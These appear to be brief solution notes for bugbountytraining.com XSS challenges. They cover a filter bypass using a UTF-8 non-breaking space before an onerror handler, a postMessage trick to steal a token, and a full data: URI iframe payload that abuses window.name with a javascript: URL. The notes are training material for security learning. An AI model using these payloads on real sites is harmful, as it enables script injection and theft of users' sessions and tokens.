### Give some space to this XSS Filter

- Check the page source, read the JS code, understand it how it is working, how it is filtering the payload.

- try different payloads with tag on URI with fragment(\#)

- On fileformat.info check for "space" in search box. And choose break space which in UTF8 is %C2%A0

Now try - 

#onerror=%C2%A0a()

Since above work, as checked in page source.

we can try:

\#onerror=%C2%A0alert(socument.domain)


### Steal teh token!

Use top.postmessage({uname:"test"},\*)

### This strict URL filter should prevent XSS, right?

solution: data:text/html,\<iframe name="\<svg onload=alert(document.domain)\>" src=https://www.bugbountytraining.com/challenges/challenge-6.php?url=javascript:name\>

explanation: When using the javascript pseudo scheme, if the returned value is a string, browsers will write it onto the page like document.write. This is why some bookmarklets have a void(0) at the end to prevent the results accidentally return a string.

Another thing to know is the window.name property persists even after navigation, and we can control this value.

So, we can assign window.name with a XSS payload in HTML, then use javascript:name so that it writes the payload onto the page.


